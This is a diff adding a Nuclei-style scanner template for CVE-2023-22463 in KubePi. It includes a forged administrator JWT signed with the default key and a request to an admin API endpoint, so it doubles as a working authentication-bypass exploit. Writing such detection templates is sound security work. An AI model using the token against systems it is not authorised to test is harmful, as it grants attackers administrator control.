@@ -1,0 +1,38 @@
+id: kubepi-jwt-default-key-bypass
+info:
+  name: KubePi JWT Default Key Permission Bypass (CVE-2023-22463)
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    KubePi has a privilege bypass vulnerability, allowing attackers to control
+    the entire platform through the default JWT user and operate core functions
+    with administrator privileges.
+  reference:
+    - https://github.com/1Panel-dev/KubePi/security/advisories/GHSA-vjhf-8vqx-vqpq
+  classification:
+    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 7.8
+    cve-id: CVE-2023-22463
+
+variables:
+  jwt_token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8"
+
+http:
+  - raw:
+      - |
+        GET /kubepi/api/v1/roles/search?pageNum=1&&pageSize=10 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{jwt_token}}
+        Content-Type: application/json
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"data\":"
+          - "\"total\":"
+          - "\"success\": true"
